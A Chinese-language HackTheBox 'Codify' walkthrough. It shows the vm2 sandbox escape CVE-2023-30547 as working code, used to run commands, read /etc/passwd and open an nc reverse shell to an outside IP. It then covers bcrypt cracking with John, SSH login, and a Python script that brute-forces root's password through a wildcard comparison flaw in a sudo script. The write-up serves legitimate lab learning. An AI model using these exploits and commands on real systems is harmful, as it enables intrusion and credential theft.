---
title: 'HackTheBox: Codify'
disqus: hackmd
---

HackTheBox: Codify
===


## Table of Contents

[TOC]

## Topic

### Lab
#### HackTheBox: 
https://app.hackthebox.com/machines/Codify

### Initial Enumeration

●Start Machine: \
![image](https://hackmd.io/_uploads/Hyf0QK_E6.png)



## Solution

### 1. Attempt

#### 1.1 Edit /etc/hosts
/etc/hosts
> 10.10.11.239    codify.htb

#### 1.2 Browse http://codify.htb/
Node.js code 線上測試平台
![image](https://hackmd.io/_uploads/SkyWuYO4p.png)
● http://codify.htb/about
![image](https://hackmd.io/_uploads/HyoTAPoET.png)
(VM2):https://github.com/patriksimek/vm2/releases/tag/3.9.16

#### 1.3 nmap scan 
> nmap -sC -sV -T4 10.10.11.239

![image](https://hackmd.io/_uploads/SyNx5tuET.png)
#### 1.4 dirsearch scan
> dirsearch -u http://codify.htb/

![image](https://hackmd.io/_uploads/rJ6hjFuNp.png)
> [15:29:00] 200 -    3KB - /About
[15:29:15] 200 -    3KB - /about
[15:30:23] 200 -    3KB - /editor
[15:30:23] 200 -    3KB - /editor/
[15:31:22] 403 -  275B  - /server-status/
[15:31:22] 403 -  275B  - /server-status


#### 1.5 Browse http://codify.htb/editor
Editor 使用vm2 v3.9.16 sandbox\
● [Sandbox Escape in vm2](https://github.com/patriksimek/vm2/blob/master/CHANGELOG.md#v3916-2023-04-11)\
● [vm2 Sandbox Escape vulnerability CVE-2023-30547](https://github.com/advisories/GHSA-ch3r-j5x3-6q2m)

![image](https://hackmd.io/_uploads/rk0HUqd46.png)

### 2. CVE-2023-30547
● [Sandbox Escape in vm2@3.9.16](https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244) \
● [handleException()](https://blog.csdn.net/scjrw/article/details/131798427): 使用handleException()方法處理異常。 handleException()方法先印出異常訊息，然後檢查是否還有更高層級的異常。如果有，我們使用handleException()方法繼續向上尋找引發該異常的異常，直到找到引發異常的來源。

```node.js=
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {}; //建立一個空的物件 err
//建立一個 Proxy 的 handler
const handler = {
    //getPrototypeOf 方法中包含一個無窮迴圈，並在每次迭代中呼叫 new Error().stack;。
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};

//建立一個代理物件 proxiedErr，使用 handler的設定。
const proxiedErr = new Proxy(err, handler);
try {
    //拋出代理，觸發 err
    throw proxiedErr;
} 
//取得err 的 constructor
catch ({constructor: c}) {
    // Node.js 的 child_process 模組執行一個command
    c.constructor('return process')().mainModule.require('child_process').execSync('touch pwned');
}
`

console.log(vm.run(code));
```

![image](https://hackmd.io/_uploads/HJ_P5g9ET.png)


### 3. Node.js exe JavaScript (execSync)
#### (1) command=id
```node.js=26
c.constructor('return process')().mainModule.require('child_process').execSync('id');
```
![image](https://hackmd.io/_uploads/Sknnq6u4T.png)
> uid=1001(svc) gid=1001(svc) groups=1001(svc)

#### (2) cat /etc/passwd
```node.js=26
c.constructor('return process')().mainModule.require('child_process').execSync('cat /etc/passwd');
```
![image](https://hackmd.io/_uploads/S1_NiadNT.png)
> root: x:0:0:root:/root:/bin/bash
daemon: x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin: x:2:2:bin:/bin:/usr/sbin/nologin
sys: x:3:3:sys:/dev:/usr/sbin/nologin
sync: x:4:65534:sync:/bin:/bin/sync
games: x:5:60:games:/usr/games:/usr/sbin/nologin
man: x:6:12: man:/var/cache/man:/usr/sbin/nologin
lp: x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail: x:8:8:mail:/var/mail:/usr/sbin/nologin
news: x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp: x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy: x:13:13:proxy:/bin:/usr/sbin/nologin
www-data: x:33:33:www-data:/var/www:/usr/sbin/nologin
backup: x:34:34:backup:/var/backups:/usr/sbin/nologin
list: x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc: x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats: x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody: x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt: x: 100:65534::/nonexistent:/usr/sbin/nologin
systemd-network: x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve: x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus: x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync: x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate: x:105:1::/var/cache/pollinate:/bin/false
sshd: x:106:65534::/run/sshd:/usr/sbin/nologin
syslog: x:107:113::/home/syslog:/usr/sbin/nologin
uuidd: x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump: x:109:115::/nonexistent:/usr/sbin/nologin
tss: x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape: x:111:117::/var/lib/landscape:/usr/sbin/nologin
usbmux: x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd: x:999: 100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq: x:113:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
joshua: x:1000:1000:,,,:/home/joshua:/bin/bash
svc: x:1001:1001:,,,:/home/svc:/bin/bash
fwupd-refresh: x:114:122:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel: x:998:998::/var/log/laurel:/bin/false

#### (3) Reverse shell

```node.js=26
c.constructor('return process')().mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.48 8666 >/tmp/f');
```
**● mkfifo**:mkfifo 是一個在 Unix/Linux 系統上用來建立 FIFO (First In, First Out) 特殊文件的命令。FIFO 通常用於Process之間的通信，但在反向 shell 的情境下，攻擊者可以使用 mkfifo 來建立一個命名的管道，並通過該管道將 shell 的輸出和輸入轉發到攻擊者的機器上。
**● nc mkfifo**: 利用 mkfifo 建立 FIFO，接著利用管道(pipe)把 FIFO 的資料流導給 /bin/sh 互動模式，同時把 /bin/sh 的標準錯誤(stderr)重新導向到標準輸出(stdout)，再把標準輸出的資料流導到 nc ，最後把 nc 接收或產生的資料流導回 FIFO，如此一來 nc 的客戶端就可以執行指令並且看到指令執行的結果。
[● Reverse Shell Generator](https://www.revshells.com/)
> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.48 8666 >/tmp/f
(1)刪除 /tmp/f 暫存檔
(2)建立 named pipe
(3)將 /tmp/f 的內容輸出到stdout
(4)互動式的 shell，將stderr導向到stdout。為確保 shell 互動的輸出和輸入都通過管道。
// 2>&1: 這是一個 I/O 重定向的部分。2 代表stderr，>&1 告訴 shell 將標準錯誤重定向到與stdout 相同的地方。
(5)建立ncat TCP 連線，將shell 的stdin和stdout與遠端的連線相連。
(6)將 nc command 的輸出（遠端 shell 的輸入）重新導向到 /tmp/f

> nc -nvlp 8666

![image](https://hackmd.io/_uploads/BJK5O0O4a.png)

### 4. John-the-Ripper SQLite database
在 /var/www/contact 找到 tickets.db 
> cat /var/www/contact/tickets.db

![image](https://hackmd.io/_uploads/r1-c9AOEa.png)
>joshua$ 2a$ 12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2

● [bcrypt: $ 2a $](https://en.wikipedia.org/wiki/Bcrypt)

> cat Codify.txt
> $ 2a$ 12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
> john --wordlist=rockyou.txt ./Codify.txt

![image](https://hackmd.io/_uploads/HkBEX1KN6.png)
> spongebob1       (?)
### 5. SSH joshua@10.10.11.239
> ssh joshua@10.10.11.239

![image](https://hackmd.io/_uploads/r1K6QkKNa.png)

### 6. Get User Flag
> joshua@codify:~$ ls
pspy64  user.txt
joshua@codify:~$ cat user.txt
68bba3c12d30c16aab5f68a01a884db0

![image](https://hackmd.io/_uploads/S1D5VJF4p.png)
> **FLAG: 68bba3c12d30c16aab5f68a01a884db0**

### 7. Privilege Escalation
> sudo -l

![image](https://hackmd.io/_uploads/rkpF_1tVa.png)
> Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
User joshua may run the following commands on codify:
    **(root) /opt/scripts/mysql-backup.sh**

User joshua 可執行 root 權限: /opt/scripts/mysql-backup.sh

> cat /opt/scripts/mysql-backup.sh
```sh=
#!/bin/bash
//備份 MySQL 的腳本
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

//-s 選項表示安靜模式輸入的字符不會顯示在終端上。
read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    //將每個資料庫備份到壓縮的 .sql.gz 
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'

```
![image](https://hackmd.io/_uploads/Sy8-wrsEp.png)
joshua 沒有 sudo 權限。

> cat /usr/bin/cat /root/.creds

![image](https://hackmd.io/_uploads/SJ8Idl9Na.png)

```sh=19
if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
```
mysql-backup.sh 可以看出DB_PASS與USER_PASS沒有經過處理。
有機會透過星號(*) 猜出root密碼。
### 8. Iteration brute-force passwd
Codify.py
```python=
import string
import subprocess
all = list(string.ascii_letters + string.digits)
# 建立all 帶有所有字母和數字的列表。
password = ""
found = False

while not found:
    for character in all:
    #迭代所有可能的字母和數字。
        command = f"echo '{password}{character}*' | sudo /opt/scripts/mysql-backup.sh"
        #以shell Command: sudo /opt/scripts/mysql-backup.sh測試密碼
        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout

        if "Password confirmed!" in output:
            #將當前字串添加到密碼中 (包括 passw*)
            password += character
            print(password)
            break
    else:
        found = True
```
>python3 codify.py

![image](https://hackmd.io/_uploads/Ski1XUjEp.png)
> kljh12k3jhaskjh12kjh3

### 9. Get Root Flag
> joshua@codify:~$ su root
Password: 
root@codify:/home/joshua# ls
codify.py  script.py  user.txt
root@codify:/home/joshua# cd ..
root@codify:/home# whoami
root

![image](https://hackmd.io/_uploads/ryiBXIi4a.png)
> root@codify:/home# cd
root@codify:~# ls
root.txt  scripts
root@codify:~# cat root.txt 
60c48b069dd807a84cb550d574d2a885

![image](https://hackmd.io/_uploads/ByW2QIsV6.png)
> **FLAG: 60c48b069dd807a84cb550d574d2a885**

###### tags: `CTF` `Web` `nmap` `dirsearch` `ncat` `Reverse shell` `John-the-Ripper` `Privilege Escalation` `bcrypt`
